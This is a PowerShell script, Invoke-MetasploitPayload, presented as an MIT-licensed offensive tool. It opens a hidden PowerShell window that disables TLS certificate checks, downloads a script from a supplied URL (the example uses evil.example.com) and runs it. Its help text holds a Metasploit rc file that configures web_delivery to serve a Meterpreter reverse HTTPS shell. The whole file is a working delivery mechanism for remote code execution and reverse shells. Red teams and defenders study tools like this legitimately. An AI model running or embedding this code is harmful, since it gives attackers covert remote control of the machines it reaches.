function Invoke-MetasploitPayload 
{
<#
.SYNOPSIS
Kick off a Metasploit Payload using the exploit/multi/script/web_delivery module
Author: Jared Haight (@jaredhaight)
License: MIT
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION
Spawns a new, hidden PowerShell window that downloads and executes a Metasploit payload from a specified URL.

This relies on the exploit/multi/scripts/web_delivery metasploit module. The web_delivery module generates a script for
a given payload and then fires up a webserver to host said script. If the payload is a reverse shell, it will also handle
starting up the listener for that payload. 

An example rc file is below (or you can just type the commands manually). It does the following:

* Sets the download cradle to port 8443 (SRVPORT) on all IPs (SRVHOST)
* Sets the script target to PowerShell (set target 2)
* Sets the payload being served to windows/meterpreter/reverse_https
* Sets the payload to listen on port 443 (LPORT) on all IPs (LHOST)

====== Invoke-MetasploitPayload rc file ======
use exploit/multi/script/web_delivery
set SRVHOST 0.0.0.0
set SRVPORT 8443
set SSL true
set target 2
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
run -j
==== end Invoke-MetasploitPayload rc file ====

.PARAMETER url
This is the URL for the download cradle, by default it will be something 
like "https://evil.example.com/[Random Chars]"

.EXAMPLE
PS C:\>Invoke-MetasploitPayload -url https://evil.example.com/2k1isEdsl
Downloads and executes a Metasploit payload located at https://evil.example.com/2k1isEdsl


.NOTES
You can use the "-verbose" option for verbose output.

.LINK
Github: https://github.com/jaredhaight/Invoke-MetasploitPayload

#>

[CmdletBinding()]
Param
(
    [Parameter( Mandatory = $True)]
    [ValidateNotNullOrEmpty()]
    [string]$url
)

    Write-Verbose "[*] Creating Download Cradle script using $url"
    $DownloadCradle ='[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'
    
    Write-Verbose "[*] Figuring out if we're starting from a 32bit or 64bit process.."
    if([IntPtr]::Size -eq 4)
    {
        Write-Verbose "[*] Looks like we're 64bit, using regular powershell.exe"
        $PowershellExe = 'powershell.exe'
    }
    else
    {
        Write-Verbose "[*] Looks like we're 32bit, using syswow64 powershell.exe"
        $PowershellExe=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
    };
    
    Write-Verbose "[*] Creating Process Object.."
    $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName=$PowershellExe
    $ProcessInfo.Arguments="-nop -c $DownloadCradle"
    $ProcessInfo.UseShellExecute = $False
    $ProcessInfo.RedirectStandardOutput = $True
    $ProcessInfo.CreateNoWindow = $True
    $ProcessInfo.WindowStyle = "Hidden"
    Write-Verbose "[*] Kicking off download cradle in a new process.."
    $Process = [System.Diagnostics.Process]::Start($ProcessInfo)
    Write-Verbose "[*] Done!"
}